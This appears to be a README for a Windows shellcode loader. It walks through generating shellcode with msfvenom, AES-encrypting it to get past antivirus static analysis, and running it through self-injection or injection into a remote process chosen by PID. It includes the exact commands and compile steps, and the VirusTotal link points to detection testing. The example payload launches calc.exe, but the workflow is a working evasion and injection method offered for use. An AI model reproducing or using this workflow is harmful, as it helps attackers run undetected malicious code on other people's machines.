#


Example shellcode generation with msfvenom:

msfvenom --platform windows --arch x64  -p windows/x64/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python | grep "buf +=" | cut -d'"' -f2 | tr -d ' ' | tr -d '\n'

First test : https://www.virustotal.com/gui/file/5757fe3deb98fc892b237ab370dc9cc51747b781e74e53e52cb2a907f1b32039

Static analysis bypass : 

use encrypt.exe
compile command: (with mingw)
gcc -o encrypt.exe better_encrypt.c -I"C:\msys64\mingw64\include" -L"C:\msys64\mingw64\lib" -funroll-loops -O3 -lssl -lcrypto

Usage example : 
./encrypt.exe <hex_file> aes_key.bin aed_iv.bin out.hex

The hex encrypted shellcode should be in out.hex

If you don't have the executable compiled, use "make" to compile it. You must have msvcpp installed and openssl. You will probably need to use your own paths for libs & includes.

Then we can just use the compiled executable with arg1 = encrypted shellcode and arg2 = "L$ L" for self-injection or " L$ H" for remote process execution and arg3 (optional) = process id if injecting into remote.

Example : 
```bash
./program.x64.exe L$ L
```
or for remote process injection :

```bash
./program.x64.exe $PID # replace $PID with the pid of an accessible program
```



